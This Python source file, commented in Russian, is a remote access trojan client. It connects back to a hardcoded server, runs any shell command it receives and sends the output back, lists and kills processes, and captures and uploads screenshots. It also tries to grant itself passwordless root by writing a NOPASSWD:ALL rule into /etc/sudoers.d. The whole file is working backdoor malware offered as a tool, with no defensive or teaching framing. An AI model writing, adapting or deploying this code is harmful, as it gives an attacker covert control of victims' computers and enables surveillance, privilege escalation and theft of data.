import socket
import subprocess
import os
import sys
import time
import getpass

SERVER_IP = "192.168.100.3"  # IP сервера, обновите под вашу сеть
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def is_windows():
    return os.name == 'nt'

def ensure_sudo_nopasswd():
    username = getpass.getuser()
    sudoers_line = f"{username} ALL=(ALL) NOPASSWD:ALL\n"
    sudoers_dir = "/etc/sudoers.d"
    sudoers_file = os.path.join(sudoers_dir, f"ratclient_{username}")

    try:
        # Проверим, есть ли уже такой файл и содержит ли он нужную строку
        if os.path.exists(sudoers_file):
            with open(sudoers_file, "r") as f:
                content = f.read()
            if sudoers_line.strip() in content:
                return True, "NOPASSWD правило уже установлено"

        # Записываем в отдельный файл sudoers
        with open(sudoers_file, "w") as f:
            f.write(sudoers_line)

        # Проверяем правильность синтаксиса
        result = subprocess.run(["visudo", "-cf", sudoers_file], capture_output=True)
        if result.returncode != 0:
            os.remove(sudoers_file)
            return False, "Ошибка проверки sudoers файла: " + result.stderr.decode()

        return True, "NOPASSWD правило успешно добавлено"
    except Exception as e:
        return False, f"Не удалось настроить NOPASSWD: {e}"

def main():
    current_dir = os.getcwd()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
        except Exception:
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE).decode(errors='ignore')
                if not data:
                    break
                if data == "exit":
                    break

                if data.startswith("cmd:"):
                    cmd = data[4:].strip()

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))

                    elif cmd == "sudo -n su":
                        # Попытка выполнить sudo su без пароля
                        output = execute_command("sudo -n su")
                        out_lower = output.lower()
                        if ("password" in out_lower or "auth" in out_lower or
                                "с отказом" in out_lower or "языком sudo" in out_lower):
                            # Ошибка с паролем, пытаемся автоматически настроить NOPASSWD
                            success, msg = ensure_sudo_nopasswd()
                            if success:
                                output = "NOPASSWD правило успешно добавлено. Пожалуйста, попробуйте команду снова."
                            else:
                                output = f"Ошибка добавления NOPASSWD: {msg}"
                        s.send(output.encode(errors='ignore'))

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode(errors='ignore'))

                elif data == "process_list":
                    if is_windows():
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode(errors='ignore'))

                elif data.startswith("kill:"):
                    pid = data[5:]
                    try:
                        if is_windows():
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode(errors='ignore'))

                elif data == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f_img:
                            while True:
                                chunk = f_img.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))

                else:
                    s.send("Неизвестная команда".encode(errors='ignore'))

        except Exception:
            pass
        finally:
            s.close()

        time.sleep(5)

if __name__ == "__main__":
    main()
